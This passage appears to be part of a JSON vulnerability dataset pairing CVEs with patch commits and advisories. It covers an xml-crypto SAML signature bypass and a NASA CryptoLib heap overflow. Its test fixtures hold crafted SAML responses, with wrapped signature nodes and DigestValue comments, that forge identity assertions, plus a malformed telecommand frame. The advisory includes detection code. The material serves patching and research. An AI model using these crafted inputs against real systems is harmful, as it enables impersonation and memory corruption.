NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion></a></samlp:Response>\n\\ No newline at end of file\n```\n\nFilename: test/static/saml_wrapped_signed_info_node.xml:\n```\n@@ -0,0 +1 @@\n+<samlp:Response xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"GOSAMLR13708454654483\" Version=\"2.0\" IssueInstant=\"2013-06-10T06:24:25Z\" Destination=\"ForNodeJS\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><saml:Assertion xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"OUR_CUSTOM_ID\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><WRAPPER><ds:SignedInfo><ds:Reference URI=\"#OUR_CUSTOM_ID\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>jGst6BnAC9xOeqa6hKNPsoMm2TY=</ds:DigestValue></ds:Reference></ds:SignedInfo></WRAPPER><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/><ds:Reference URI=\"#pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>Gx0mTydMn1k6804jZBrdUrZmbV4=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>oHEPKtwoCbfq1QRm2pjx35zVMqAsti4nQU+3ws8EUJUXHmPG2EoX3HBkb7D2wN4m+ZFrdwARUpNJlhhOIz/eG4jES6ar0tvlNN3qE5cqcQhwZHyRARLnTlERqyZU9Qm729DnAGBeXCdMb736zi16onOIVPNA63LRTzUIxhyZqypDCf1wd6me/ur6UUgH11nYOu4JDYx0iWNkXc1Nad7vkF9oMPeO1QsMxuZSIVH4tvdJkue+qAnu2l+dFJb0LPfm+xmIC0FBo+VX1ECCWRoUZIxjotQfAM6yZpHIi5fNqPXkVyN9fYoUEa9CafqHlc4tAAdgAgGeOqA3jWeC8ZnOVA==</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIEHjCCAwagAwIBAgIBATANBgkqhkiG9w0BAQUFADBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbTAeFw0xMzA1MjcwODU1MTNaFw0xODA1MjcwODU1MTNaMGcxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMRUwEwYDVQQHDAxTYW50YSBNb25pY2ExETAPBgNVBAoMCE9uZUxvZ2luMRkwFwYDVQQDDBBhcHAub25lbG9naW4uY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoXoc7IFZQRv+SwJ15zjIl9touwY5e6b7H4vn3OtOUByjOKHUX8VX0TpbAV2ctZE2GSALx1AGuQAv6O4MVUH+qn/2IAiBY3a7zKN07UBsya7xFMQVHuGE6EiBAs9jpA9wjvYMPRkS5wYZcwjpTQSZK7zFPPtobG8K/1vDbm/tWZjNLmZmQePmXpwrQAuC0+NlzlmnjoQYB2xp2NaTUK9JnnmuB5qev3dpUwlYGSJpf+HUIoxuo8IpxAXOymq1d6tEEJgU1kR2sa7o1sSRFo31YeW/qYCP/gcLJZo3MRUDFe0g5MHeliFue9DsKYUsC6qwAD3gc+MI47buiD6Msu11cwIDAQABo4HUMIHRMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFAAJFJRIlpQQSFsuNdeq7FkTJIH4MIGRBgNVHSMEgYkwgYaAFAAJFJRIlpQQSFsuNdeq7FkTJIH4oWukaTBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbYIBATAOBgNVHQ8BAf8EBAMCBPAwDQYJKoZIhvcNAQEFBQADggEBAB9zN+g6N4sUBE61RaMUH2LSHWwOtfhL64i7pjHjvZa47/qcV/S0Yyd4IE44ho9i2N+AM79d34mThc30oK5aVxOKphKf+xM/cOyVaWIeqr+dCbkY/0OpLEwWOh9VSgOizRO3evLMurbtR892LbSK/Td3hG5jfwoHD23nHH87Dv/3KyZox9MkJdY2DXOHGGIcsqoIifaTyNZyhW6RgwEujQ6LjsaolP1YoeV85TZFKTLa1Ta7ZLUVUC2UJWqz+kRlsyGxf+E/ZmJ7hSq0ZBVHrVOyXjCcFn6X0/W5SrpOmN3fZYcj8Bp6vhB0cJk9qpjgWOP2RCuBdHZVawjCjIaE+bc=</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">anyone@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion><a><saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">kartik.cds@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion></a></samlp:Response>\n\\ No newline at end of file\n```\n\nFilename: test/static/valid_saml_with_digest_comment.xml:\n```\n@@ -0,0 +1,7 @@\n+<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"pfx94e4a319-b6f7-4a40-25d1-01fcb642e4c5\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\" Destination=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>\n+<saml:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" ID=\"pfx66496e6c-3c29-230d-6d47-b245434b872d\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n+  <ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n+    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n+  <ds:Reference URI=\"#pfx66496e6c-3c29-230d-6d47-b245434b872d\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue><!--6zWeUASlD8E73xzDn4ggf0r7ysQ=-->RnNjoyUguwze5w2R+cboyTHlkQk=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>aw5711jKP7xragunjRRCAD4mT4xKHc37iohBpQDbdSomD3ksOSB96UZQp0MtaC3xlVSkMtYw85Om96T2q2xrxLLYVA50eFJEMMF7SCVPStWTVjBlaCuOPEQxIaHyJs9Sy3MCEfbBh4Pqn9IJBd1kzwdlCrWWjAmksbFFg5wHQJA=</ds:SignatureValue>\n+<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICizCCAfQCCQCY8tKaMc0BMjANBgkqhkiG9w0BAQUFADCBiTELMAkGA1UEBhMCTk8xEjAQBgNVBAgTCVRyb25kaGVpbTEQMA4GA1UEChMHVU5JTkVUVDEOMAwGA1UECxMFRmVpZGUxGTAXBgNVBAMTEG9wZW5pZHAuZmVpZGUubm8xKTAnBgkqhkiG9w0BCQEWGmFuZHJlYXMuc29sYmVyZ0B1bmluZXR0Lm5vMB4XDTA4MDUwODA5MjI0OFoXDTM1MDkyMzA5MjI0OFowgYkxCzAJBgNVBAYTAk5PMRIwEAYDVQQIEwlUcm9uZGhlaW0xEDAOBgNVBAoTB1VOSU5FVFQxDjAMBgNVBAsTBUZlaWRlMRkwFwYDVQQDExBvcGVuaWRwLmZlaWRlLm5vMSkwJwYJKoZIhvcNAQkBFhphbmRyZWFzLnNvbGJlcmdAdW5pbmV0dC5ubzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAt8jLoqI1VTlxAZ2axiDIThWcAOXdu8KkVUWaN/SooO9O0QQ7KRUjSGKN9JK65AFRDXQkWPAu4HlnO4noYlFSLnYyDxI66LCr71x4lgFJjqLeAvB/GqBqFfIZ3YK/NrhnUqFwZu63nLrZjcUZxNaPjOOSRSDaXpv1kb5k3jOiSGECAwEAATANBgkqhkiG9w0BAQUFAAOBgQBQYj4cAafWaYfjBU2zi1ElwStIaJ5nyp/s/8B8SAPK2T79McMyccP3wSW13LHkmM1jwKe3ACFXBvqGQN0IbcH49hu0FKhYFM/GPDJcIHFBsiyMBXChpye9vBaTNEBCtU3KjjyG0hRT2mAQ9h+bkPmOvlEo/aH0xR68Z9hw4PF13w==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID SPNameQualifier=\"passport-saml\" Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\">test@example.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2012-07-03T11:37:20Z\" Recipient=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2012-07-03T11:31:50Z\" NotOnOrAfter=\"2012-07-03T11:37:20Z\"><saml:AudienceRestriction><saml:Audience>passport-saml</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2012-07-03T11:32:20Z\" SessionNotOnOrAfter=\"2012-07-03T19:32:20Z\" SessionIndex=\"_c8e6823fe38ddbce125f9be6e5118b8c352d04bcae\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"uid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"givenName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"sn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"cn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"mail\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonPrincipalName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonTargetedID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.42\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.4\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.6\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.10\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion>\n+</samlp:Response>\n\\ No newline at end of file\n```",
                "url": "https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07"
            }
        ],
        "published_date": "2025-03-14T17:11:05.590Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nnode-saml\n/\nxml-crypto\nPublic\nNotifications You must be signed in to change notification settings\nFork 182\nStar 205\nCode\nIssues\n41\nPull requests\n18\nDiscussions\nActions\nProjects\nWiki\nSecurity\n4\nInsights\nAdditional navigation options\nXML Signature Verification Bypass via DigestValue Comment\nCritical cjbarth published GHSA-x3m8-899r-f7c3 on Mar 14Mar 14, 2025\nPackage\nnpm xml-crypto\n(\nnpm\n)\nAffected versions\n<= 6.0.0\nPatched versions\n6.0.1, 3.2.1, 2.1.6\nDescription\nImpact\nAn attacker may be able to exploit this vulnerability to bypass authentication or authorization mechanisms in systems that rely on xml-crypto for verifying signed XML documents. The vulnerability allows an attacker to modify a valid signed XML message in a way that still passes signature verification checks. For example, it could be used to alter critical identity or access control attributes, enabling an attacker to escalate privileges or impersonate another user.\nPatches\nAll versions <= 6.0.0 are affected. Please upgrade to version 6.0.1.\nIf you are still using v2.x or v3.x please upgrade to the associated patch version.\nIndicators of Compromise\nWhen logging XML payloads, check for the following indicators. If the payload includes encrypted elements, ensure you analyze the decrypted version for a complete assessment. (If encryption is not used, analyze the original XML document directly). This applies to various XML-based authentication and authorization flows, such as SAML Response payloads.\nPresence of Comments in DigestValue\nA DigestValue should not contain comments. If you find comments within it, this may indicate tampering.\nExample of a compromised DigestValue:\n<DigestValue>\n    <!--TBlYWE0ZWM4ODI1NjliYzE3NmViN2E1OTlkOGDhhNmI=-->\n    c7RuVDYo83z2su5uk0Nla8DXcXvKYKgf7tZklJxL/LZ=\n</DigestValue>\nCode to test\nPass in the decrypted version of the document\ndecryptedDocument = ... // yours to implement\n\nconst digestValues = xpath.select(\n  \"//*[local-name()='DigestValue'][count(node()) > 1]\",\n  decryptedDocument,\n);\n\nif (digestValues.length > 0) {\n  // Compromise detected, yours to implement\n}\nSeverity\nCritical\nCVE ID\nCVE-2025-29775\nWeaknesses\nCWE-347\nCredits\nahacker1-securesaml\nFinder\nmarktran\nCoordinator\nmattgd\nRemediation developer\nblairworkos\nRemediation developer\nmthadley\nRemediation developer\nnickcollisson-workos\nRemediation reviewer\nlatacora-paul\nRemediation reviewer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a small code snippet that outlines steps to identify the vulnerability using comments in the DigestValue but doesn't necessarily provide a complete proof of concept.",
                "url": "https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3"
            }
        ],
        "sw_version": "v4.0.0",
        "sw_version_wget": "https://github.com/node-saml/xml-crypto/archive/refs/tags/v4.0.0.zip"
    },
    "CVE-2025-29909": {
        "cwe": [
            {
                "id": "CWE-191",
                "value": "CWE-191: Integer Underflow (Wrap or Wraparound)"
            },
            {
                "id": "CWE-787",
                "value": "CWE-787: Out-of-bounds Write"
            }
        ],
        "description": "CryptoLib provides a software-only solution using the CCSDS Space Data Link Security Protocol - Extended Procedures (SDLS-EP) to secure communications between a spacecraft running the core Flight System (cFS) and a ground station. In versions 1.3.3 and prior, a heap buffer overflow vulnerability in CryptoLib's `Crypto_TC_ApplySecurity()` allows an attacker to craft a malicious TC frame that causes out-of-bounds memory writes. This can result in denial of service (DoS) or, under certain conditions, remote code execution (RCE). Any application or system that relies on CryptoLib for Telecommand (TC) processing and does not strictly validate incoming TC frames is at risk. This includes satellite ground stations or mission control software where attackers can inject malformed frames. A patch is available at commit c7e8a8745ff4b5e9bd7e500e91358e86d5abedcc.",
        "languages": [
            "C"
        ],
        "patch_commits": [
            {
                "content": "Merge branch 'advisory-fix-1' of https://github.com/nasa/CryptoLib-ghsa-q2pc-c3jx-3852 into advisory-fix-1\n\nFilename: src/core/crypto_tc.c:\n```\n@@ -1871,6 +1871,13 @@\nint32_t Crypto_TC_ProcessSecurity_Cam(uint8_t *ingest, int *len_ingest, TC_t *tc\n \n     Crypto_TC_Calc_Lengths(&fecf_len, &segment_hdr_len);\n \n+    if(tc_sdls_processed_frame->tc_header.fl <= TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1)\n+    {\n+        status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;\n+        mc_if->mc_log(status);\n+        return status;\n+    }\n+\n     // Parse & Check FECF\n     Crypto_TC_Parse_Check_FECF(ingest, len_ingest, tc_sdls_processed_frame);\n```\n\nFilename: test/unit/ut_tc_process.c:\n```\n@@ -1262,4 +1262,57 @@\nUTEST(TC_PROCESS, TC_KEY_STATE_TEST)\n     Crypto_Shutdown();\n }\n \n+UTEST(TC_PROCESS, TC_HEAP_BUFFER_OVERFLOW_TEST)\n+{\n+    remove(\"sa_save_file.bin\");\n+    // Local Variables\n+    int32_t status = CRYPTO_LIB_SUCCESS;\n+\n+    // Configure Parameters\n+    Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_INTERNAL, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_LIBGCRYPT,\n+                            IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,\n+                            TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,\n+                            TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);\n+    // AOS Tests\n+    // Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_OCF_NA, 1024,\n+    // AOS_FHEC_NA, AOS_IZ_NA, 0);\n+    GvcidManagedParameters_t AOS_Managed_Parameters = {\n+        0, 0x0003, 0, TC_HAS_FECF, AOS_FHEC_NA, AOS_IZ_NA, 0, TC_HAS_SEGMENT_HDRS, 1024, TC_OCF_NA, 1};\n+    Crypto_Config_Add_Gvcid_Managed_Parameters(AOS_Managed_Parameters);\n+\n+    status = Crypto_Init();\n+\n+    TC_t *tc_sdls_processed_frame;\n+    tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);\n+    memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));\n+\n+    // Test frame setup\n+    char    *test_frame_pt_h = \"080300007f0b000afd020202027fff02020202020202020202020202029bdd5f3c98dd1c50d27a430\"\n+                               \"a4b6757aa33ec183952a9f76e504eb5f8001066ed6c00c8788e11997f2a058da1633e11fed9851d45\"\n+                               \"7bb31a9637ec8f4f15bc8575a0e7104dba5c666b17f7cccdc2adbff9\";\n+    uint8_t *test_frame_pt_b = NULL;\n+    int      test_frame_pt_len = 0;\n+\n+    SecurityAssociation_t *test_association;\n+    sa_if->sa_get_from_spi(10, &test_association);\n+    test_association->sa_state  = SA_OPERATIONAL;\n+    test_association->est       = 1;\n+    test_association->arsn_len  = 0;\n+    test_association->shsnf_len = 0;\n+\n+    crypto_key_t *ekp = NULL;\n+    ekp               = key_if->get_key(test_association->ekid);\n+    ekp->key_state    = KEY_ACTIVE;\n+\n+    // Convert input test frame\n+    hex_conversion(test_frame_pt_h, (char **)&test_frame_pt_b, &test_frame_pt_len);\n+\n+    status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);\n+\n+    ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW, status);\n+    free(test_frame_pt_b);\n+    free(tc_sdls_processed_frame);\n+    Crypto_Shutdown();\n+}\n+\n UTEST_MAIN();\n```",
                "url": "https://github.com/nasa/CryptoLib/commit/c7e8a8745ff4b5e9bd7e500e91358e86d5abedcc"
            }
        ],
        "published_date": "2025-03-17T21:55:14.979Z",
        "sec_adv": [
            {
